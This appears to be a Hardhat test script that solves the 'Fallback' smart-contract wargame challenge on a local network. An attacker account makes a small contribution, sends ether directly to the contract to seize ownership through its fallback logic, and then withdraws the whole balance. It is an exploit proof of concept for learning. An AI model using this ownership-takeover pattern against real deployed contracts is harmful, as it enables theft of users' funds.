import { expect } from "chai";
import hre from "hardhat";
import { defineConfig } from "hardhat/config";
import hardhatNetworkHelpers from "@nomicfoundation/hardhat-network-helpers";
const { ethers, networkHelpers } = await hre.network.connect();

export default defineConfig({
  plugins: [hardhatNetworkHelpers],
});

describe("Fallback Test", function () {

 it("Fallback ownserships", async () => {

  // setup users
  const [deployer, attacker] = await ethers.getSigners();
  await networkHelpers.setBalance(attacker.address, ethers.parseEther("1"));

  // deploy contract
  const Fallback = await ethers.getContractFactory("Fallback",deployer);
  const fallback=await Fallback.deploy();
  await fallback.waitForDeployment();

  console.log('Contract Balance at start is: ',ethers.formatEther(await ethers.provider.getBalance(fallback.getAddress())));

  console.log('Attacker Balance at start is: ',ethers.formatEther(await ethers.provider.getBalance(attacker.address)));

  // make sure deployer is the owner
  const owner = await fallback.owner();
  expect(owner).to.equal(deployer);

  // contribute as attacker
  const fallbackAsAttacker = fallback.connect(attacker);
  await fallbackAsAttacker.contribute({ value: ethers.parseEther("0.0001") ,});
  console.log('Attacker contribution: ',ethers.formatEther(await fallbackAsAttacker.getContribution()));
  console.log('Contract Balance after contribution is: ',ethers.formatEther(await ethers.provider.getBalance(fallback.getAddress())));
  console.log('Attacker balance after Contribution: ',ethers.formatEther(await ethers.provider.getBalance(attacker.address)));



  // send some ether directly as attacker
  await attacker.sendTransaction({to: await fallback.getAddress(),value: ethers.parseEther("0.0001"),});
  console.log('Contract Balance after transaction is: ',ethers.formatEther(await ethers.provider.getBalance(fallback.getAddress())));
  console.log('Attacker balance after Transaction: ',ethers.formatEther(await ethers.provider.getBalance(attacker.address)),"\n");



  // check if attacker is now owner
  expect(await fallback.owner()).to.equal(attacker);

  // withdraw all funds
  console.log('---Attacker now withdrawing funds---\n')
  await fallbackAsAttacker.withdraw();
  const balance = await ethers.provider.getBalance(attacker.address);
  console.log('Attacker balance after withdrawal: ',ethers.formatEther(balance));
  console.log('Contract balance after withdrawal: ',ethers.formatEther(await ethers.provider.getBalance(fallback.getAddress())));
  expect(await ethers.provider.getBalance(fallback.getAddress())).to.equal(0);



 

});


});